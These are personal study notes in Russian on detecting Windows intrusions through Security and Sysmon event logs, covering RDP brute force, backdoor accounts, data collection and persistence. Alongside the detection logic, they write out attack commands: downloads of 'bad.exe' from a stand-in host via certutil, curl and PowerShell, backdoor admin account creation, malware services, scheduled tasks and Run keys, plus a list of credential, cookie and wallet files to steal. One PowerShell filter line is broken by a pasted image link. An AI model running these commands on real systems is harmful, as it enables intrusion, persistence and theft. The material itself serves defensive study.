
____

[[Core Windows Processes]]
[[Sysmon]]
[[Windows Event Logs]]

____

Чаще всего используется Security log. 2 самых важных лога - 4642(Successful logon) и 4625(Failed logon). 

### Самые простые техники
**RDP Brut Force**
Смотреть  4625 EventID  с Logon type 3 и 10(сетевая авторизация).  Далее там надо искать очевидные паттерны, вроде того, что много неправильных запросов на 1 имя пользователя
**Analyse RDP Logons**
При включенном NLA каждое RDP logon сначала идет logon type 3 и сразу за ним logon type 10.
NLA - это средство защиты, которые не отрисовывает для пользователя, чей пароль еще не был проверен, для защиты от DoS атаки. 
Нужно смотреть брут-форс или подозрительные IP.  
Для каждой сессии Windows выдает Logon ID. Если авторизация подозрительная можно посмотреть что дальше происходило в этой сессии. 
**Backdoored users**
Искать 4720/4732 eventID.  Искать подозрительные паттерны, если чтото нашлось, копировать Logon ID и смотреть что было дальше.
**Files**
Файлы лежат в промежуточной директории - C:\Temp, C:\Users/Public, появились странные .bat и .ps1 файлы или .exe .com(исполняемые). Созданы файлы или ключи регистра, которые используются для *persistence*. 
**Network**
Соединения с внешними IP адресами, DNS запросы с подозрительными именами, IP из VirusTotal. 
**Powershell Logging Commands**
```
C:\Users<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
//файл где можно смотреть всю историю Powershell для какого-то пользователя.
```

### Threat Detection 1 - Initial ascess
На моей практике получается, что смотреть быстрее всего через xpath фильтры + моя функция по извлечению
***Initial access via RDP***
Проверка логов, если есть соединения из внешней сети
```
Get-WinEvent -Path $path | Get-SysmonTable | Where-Object { 
    # Первое условие: тип логина 3 или 10
    ($_.logontype -in 3, 10) -and 
    # Второе условие: IP-адрес НЕ начинается с приватных диапазонов
    ($_.IpAddress -notlike '10.*' -and 
     $_.IpAddress -notlike '192.![[Pasted image 20261003133847.png]]168.*' -and 
     $_.IpAddress -notlike '172.1[6-9].*' -and 
     $_.IpAddress -notlike '172.2[0-9].*' -and 
     $_.IpAddress -notlike '172.3[0-1].*' -and 
     $_.IpAddress -ne '127.0.0.1' -and 
     $_.IpAddress -ne '::1')
}
```

Помимо обычных исполняемых файлов есть еще **.com**, **.scr**, or **.cpl** файлы
Также часто вместо того, чтобы прикладывать явно .exe файлы, в почту прикладываются, например lnk файлы:
![[Pasted image 20261003133847.png]]
за ярлыком реально не видно, что там на самом деле, поэтому так. 
```
tar -xf ".\New PC Store!.zip" -O "Official Website.lnk" 
// просмотр файла в архив-папке, но не сохраняем его явно на диск
tar -tf ".\New PC Store!.zip"
// просмотр файлов в архиве
```


### Threat Detection 2
#### Discovery
Ну просто смотреть команды от процесса)
```
Get-WinEvent -Logname Microsoft-Windows-Sysmon/Operational |	Where-Object {    
	$_.EventID -eq 1 -and 
	$_.ParentImage -like '*evil_process_name*' 
}	 
// посмотрит все процессы созданные от evil процесса.
```
Например можно посмотреть команды с Image like "*cmd*" или powershell, и там будет видно, какие консольные команды выполнял подозрительный процесс.
#### Collection, Exfiltration, Credential Acesss
Здесь будет про все что на картинке
![[Pasted image 20261004122103.png]]
Стандартный цели Collection снизу:
```
C:\Users\<user>\AppData\Roaming\Signal\*
// папка в которой хранятся сообщения из мессенджера Signal

C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History
// история браузера Chrome для основного пользователя

C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
// файл кошелька Bitcoin Core

C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies
// файл куки Chrome 

C:\Users\<user>\.ssh\*
// ssh credentials

C:\Program Files\Microsoft SQL Server\...\DATA\*
// каталог данных Microsoft SQL Server
```

Потом мб напишу дешифратор паролей, но пока Deepseek не хочет писать, а мне лень его заставлять. 

#### Ingress Tool Transfer - Перенос инструментов в систему
Часто нужно переносить в систему инструменты. Примеры:
1. Seatbelt для ускоренного Discovery
2. Mimikatz для извлечения сохраненных паролей и OS креденшиалов.
3. RAT - remote acess trajan
4. ransomware

|                     |                                                                                             |                                                                                      |
| ------------------- | ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| Certutil            | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`                           | утилита, которая есть везде, и изначально нужна для создания/скачивания сертификатов |
| сurl                | `curl.exe https://blackhat.thm/bad.exe -o good.exe`                                         | нужен именно curl.exe, поскольку curl - alias на Invoke-WebRequest                   |
| PowerShell          | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` | обычный Invoke-WebRequest                                                            |
| Graphical Interface | Просто через браузер                                                                        | Самый сложный для обнаружения, выглядит как абсолютно легитимная деятельность        |

### Threat Detection 3
#### C2
В большинстве случае приложение из письма скачается, спрячется в какой-нибудь папке и запустится как новый процесс.
Нужно смотреть по EventID 1, 11, 3, для получение информации о ситуации
#### Persistence

Часто нужно наладить *Persistence* в системе. 
Если доступ получается через неправильно настроенный сервер, например RDP со слабым паролем. то можно просто получит доступ через него же. Но чаще:
	1. создают дополнительные уязвимости, например бэкдоор
	2. Создают нового пользователя и делают его администратором.
Примеры:
```
CMD C:\> net user "mr.backd00r" "p@ssw0rd!" /add
PS  C:\> New-LocalUser "mr.backd00r" -Password [...]
//создание пользователя, обнаруживается через 4720

CMD C:\> net localgroup Administrators "mr.backd00r" /add
PS  C:\> Add-LocalGroupMember "Administrators" -Member "mr.backd00r"
//добавление пользователя в админки, обнаруживается через 4732

//также могут просто сбросить пароль - 4724
```

Нужно смотреть, кто именно создает аккаунт, какой sourceIP и время создания, какие другие подозрительные события можно увидеть в сессии создателя

***Malware Persistence***
Persistence через пользователя не работает, если атака началась через малварь или через USB, а не через RDP. 
Для этого нужно чтобы малварь запускался при запуске системы:
*сервис - программа которая работает постоянно в фоей*
*планируемая задача - задача, которая выполняется раз в какое-то время*. 

|                                                     |                                                                              |                                                                     |                            |
| --------------------------------------------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------- | -------------------------- |
| Создание Windows Сервиса                            | `sc create "BadService" binpath= "C:\malware.exe" start= auto`               | Sysmon:  **1**  <br>Security / **4697**(создание сервиса)<br>       | services.exe               |
| Create a Scheduled Task  <br>(Run after OS startup) | `schtasks /create /tn "BadTask" /tr "C:\malware.exe" /sc onstart /ru System` | Sysmon: **1**  <br>Security / **4698**(создание планируемой задачи) | svchost.exe<br>taskeng.exe |

***Run keys and Startup***
Можно еще проще, чтобы malware запускался только для конкретного пользователя.

|                                        |                                                                                                           |                                                 |
| -------------------------------------- | --------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| Добавить малварь в Startup папку       | copy C:\malware.exe  <br>"%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"            | **New startup item:** Sysmon Event ID **1**<br> |
| Добавить малварь в "RUN" ключ регистра | reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"  <br>/v BadKey /t REG_SZ /d "C:\malware.exe" | **New registry value:** Sysmon Event ID **13**  |
У программ, запущенных со стартом системы, родитель будет *explorer.exe*. 
